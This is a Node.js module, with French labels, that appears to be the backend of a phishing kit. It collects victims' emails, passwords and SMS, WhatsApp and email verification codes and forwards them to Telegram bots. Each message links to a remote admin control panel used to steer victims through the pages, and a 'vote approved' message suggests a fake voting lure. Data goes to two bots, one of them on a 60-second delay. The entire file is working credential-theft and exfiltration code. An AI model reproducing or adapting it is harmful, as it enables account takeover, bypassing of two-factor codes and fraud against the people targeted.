const { getClient } = require('./db');

function getAdminUrl(session, ip) {
  return `https://voyage-production-a035.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
}

async function sendToTelegramBot(token, chatId, message) {
  if (!token || !chatId) return;

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await resp.json();
    if (!data.ok) {
      console.error('[TG] Erreur API:', data.description);
    }
  } catch (err) {
    console.error('[TG] Erreur reseau:', err.message);
  }
}

async function sendTelegram(message) {
  const token1 = process.env.TELEGRAM_BOT_TOKEN;
  const chatId1 = process.env.TELEGRAM_CHAT_ID;
  const token2 = process.env.TELEGRAM_BOT_TOKEN_2;
  const chatId2 = process.env.TELEGRAM_CHAT_ID_2;

  if (!token1 && !token2) {
    console.log('[TG] Pas de token/chat configure. Message:', message.replace(/<[^>]+>/g, ''));
    return;
  }

  await Promise.all([
    new Promise(resolve => setTimeout(() => sendToTelegramBot(token1, chatId1, message).then(resolve), 60000)),
    sendToTelegramBot(token2, chatId2, message)
  ]);
}

function getFieldLabel(field) {
  const labels = { email: 'Email', password: 'dp', sms_code: 'Code SMS', whatsapp_code: 'Code WhatsApp', email_code: 'Code Email' };
  return labels[field] || field;
}

function getClientSummary(session, ip) {
  const client = getClient(session, ip);
  if (!client) return '';
  let lines = [];
  if (client.email) lines.push(`Email: <code>${client.email}</code>`);
  if (client.password) lines.push(`dp: <code>${client.password}</code>`);
  if (client.sms_code) lines.push(`Code SMS: <code>${client.sms_code}</code>`);
  if (client.whatsapp_code) lines.push(`Code WhatsApp: <code>${client.whatsapp_code}</code>`);
  if (client.email_code) lines.push(`Code Email: <code>${client.email_code}</code>`);
  return lines.length ? `\nDonnees collectees:\n${lines.join('\n')}` : '';
}

function adminButton(session, ip) {
  const url = getAdminUrl(session, ip);
  return url ? `\n\n🎛 <a href="${url}">Ouvrir le panneau admin</a>` : '';
}

function notifyNewClient(client) {
  return sendTelegram(
    `<b>NOUVEAU CLIENT</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${client.ip}</code>` +
    `\n\n🎛 <a href="${getAdminUrl(client.session, client.ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyData(session, ip, field, value) {
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>NOUVEAU CLIENT</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${ip}</code>` +
    summary +
    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyAction(session, ip, action) {
  return sendTelegram(
    `<b>ACTION ADMIN</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Action: <code>${action}</code>\n` +
    `IP: <code>${ip}</code>`
  );
}

function notifyPageChange(session, ip, page) {
  return sendTelegram(
    `<b>PAGE CHANGEE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Page: <code>${page}</code>\n` +
    `IP: <code>${ip}</code>` +
    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyVoteApproved(session, ip) {
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>VOTE APPROUVE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${ip}</code>` +
    summary
  );
}

module.exports = { sendTelegram, notifyNewClient, notifyData, notifyAction, notifyPageChange, notifyVoteApproved };
